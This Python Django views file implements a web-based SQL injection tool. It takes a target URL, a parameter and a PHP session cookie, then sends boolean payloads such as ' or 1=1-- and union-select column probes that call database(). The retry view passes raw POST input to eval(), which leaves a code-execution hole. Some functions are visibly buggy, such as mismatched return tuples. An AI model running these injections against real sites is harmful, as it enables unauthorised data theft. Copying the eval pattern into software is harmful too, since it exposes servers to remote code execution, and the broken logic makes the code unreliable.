from django.shortcuts import render
import requests
from bs4 import BeautifulSoup
# Create your views here.

class RequestClass:
    def __init__(self, method, url, cookie, parameter, find, result, name):
        self.method = method.lower()
        self.result = result.lower()
        self.url = url
        self.cookie = cookie
        self.parameter = parameter
        self.find = find
        self.name = name

        if (self.cookie):
            self.attackSession = requests.session()
            self.attackSession.cookies.set('PHPSESSID', cookie)
        else:
            self.attackSession = requests.session()

    def sendPacket(self, attackQuery):
        pvalue = self.find.split(',')
        if (self.method == "post"):
            res = self.attackSession.post(url=self.url, data=attackQuery)
        else:
            res = self.attackSession.get(url=self.url, params=attackQuery)

        print(attackQuery)
        with res as response:
            bs = BeautifulSoup(response.text, 'html.parser')
            if (self.result == "query"):
                print(response.url)
                for value in pvalue:
                    if value in bs.get_text():
                        return 1,response.url

                return 0,response.url

            if (self.result == "know"):

                for value in pvalue:
                    if value in bs.get_text():
                        return 1,''

                return 0,''

    def sendPacketGetText(self, attackQuery):
        if (self.method == "post"):
            res = self.attackSession.post(url=self.url, data=attackQuery)
        else:
            res = self.attackSession.get(url=self.url, params=attackQuery)

        with res as response:
            bs = BeautifulSoup(response.text, 'html.parser')
            return bs.get_text(), response.url

    def UnionExploit(self, attackQuery, j, i):
        attackQuery = attackQuery.replace('i', 'database()')
        res = self.attackSession.post(url=self.url, data=attackQuery)
        return res.text ,res.url



def exploit2 (url, cookie, find, name, method, parameter,result, query):
    attack_querys =''
    test = RequestClass(method, url, cookie, parameter, find, result, name)
    result = test.sendPacket({name: parameter + str(query)})

    attack_querys += result[1]

    return result[0],attack_querys

def exploit (url, cookie, find, name, method, parameter,result):
    if (method == "get"):
        test = RequestClass(method, url, cookie, parameter, find, result, name)
        attack_querys = ''
        for i in range(1, 3):
            result = test.sendPacket({name: parameter + f"' and 1={i}-- "})
            attack_querys += result[1] + '\n'
            if result[0] == 1 :
                flag = 1
                start = "'"
                return 1,attack_querys,flag,start
            else :
                result = test.sendPacket({name: parameter + f"' or 1={i}-- "})
                attack_querys += result[1] + '\n'
                if result[0] == 1:
                    flag = 1
                    start = "'"
                    return 1, attack_querys,flag,start



        for i in range(1, 3):
            result = test.sendPacket({name: parameter + f'" and 1={i}-- '})
            attack_querys += result[1] + '\n'
            if result[0] == 1:
                flag = 1
                start = '"'
                return 2,attack_querys,flag,start
            else :
                result = test.sendPacket({name: parameter + f'" or 1={i}-- '})
                attack_querys += result[1] + '\n'
                if result[0] == 1:
                    flag = 1
                    start = '"'
                    return 2, attack_querys,flag,start


        for i in range(1, 3):
            result =  test.sendPacket({name: parameter + f' and 1={i}-- '})
            attack_querys += result[1] + '\n'
            if result[0] == 1:
                flag = 1
                start = str(parameter)
                return 3,attack_querys,flag,start
            else :
                result = test.sendPacket( {name: parameter + f' and 1={i}-- '})
                attack_querys += result[1] + '\n'
            if result[0] == 1:
                flag = 1
                start = str(parameter)
                return 3, attack_querys,flag,start

        return -1, attack_querys

def union(url, cookie, find, name, method, parameter, result,flag,start):
    j = 0
    union = "union select 1"
    test = RequestClass(method, url, cookie, parameter, find, result, name)
    attack_querys = ''
    if (flag == 1):
        while 1:
            result = test.sendPacket({name: start + ' ' + union + '-- '})
            if result[0] == 1 :
                text = test.sendPacketGetText({test.name: start + ' ' + union + '-- '})
                for k in range(1, j + 1):
                    k = str(k)
                    if k in text:
                        find = text.find
                        print("union exploit")
                        find2 = test.UnionExploit({name: start + ' ' + union + '-- '}, j, k)
                        print(find2[0][find])
                        flag = 2
                        break
            if (flag == 2):
                return 1,attack_querys
            attack_querys += find[1]
            j = j + 1
            union = union + ',' + f'{j}'



def retry(request):
    if(request.method == "POST"):
        query = (request.POST.get("requery"))
        a = eval(request.POST.get("origin"))
        url = a[0]
        cookie = a[1]
        find = a[2]
        name = a[3]
        method = a[4]
        parameter = a[5]
        result = a[6]
        print(query)
        a,testtest = exploit2(url, cookie, find, name,  method, parameter, result, query)
        if(a==1) :
            return render(request,'injection/result.html',{'ttt':testtest,'s':'1'})
        else :
            return render(request, 'injection/result.html', {'ttt': testtest, 'f': '1'})

def index(request):
    if(request.method == 'POST'):
        url = request.POST.get("url", False)
        cookie = request.POST.get("cookie", False)
        find = request.POST.get("find", False)
        name = request.POST.get("name", False)
        method = request.POST.get("method", False)
        parameter = request.POST.get("parameter", False)
        result = request.POST.get("result", False)

        test= []
        test.append(url)
        test.append(cookie)
        test.append(find)
        test.append(name)
        test.append(method)
        test.append(parameter)
        test.append(result)
        a,value,flag,start = exploit(url, cookie, find, name, method, parameter, result)
        #b,url = union(url, cookie, find, name, method, parameter, result,flag,start)
        list = ["' or 1=1-- ", "' and 1=1-- ", '" or 1=1-- ', '" and 1=1-- ', ' or 1=1-- ', ' and 1=1-- ']

        if(a >= -1):
            if(a==1):
                return render(request,'injection/result.html',{'data':value,'double':'1','origin':str(test),'list': list})
            elif (a == 2):
                return render(request, 'injection/result.html', {'data': value, 'single': '1','origin':str(test),'list': list})
            elif (a == 3):
                return render(request, 'injection/result.html', {'data': value, 'integer': '1','origin':str(test),'list': list})

        return render(request, 'injection/result.html', {'data':value,'origin':str(test),'list': list})

    return render(request,'injection/index.html',{'data':'no'})


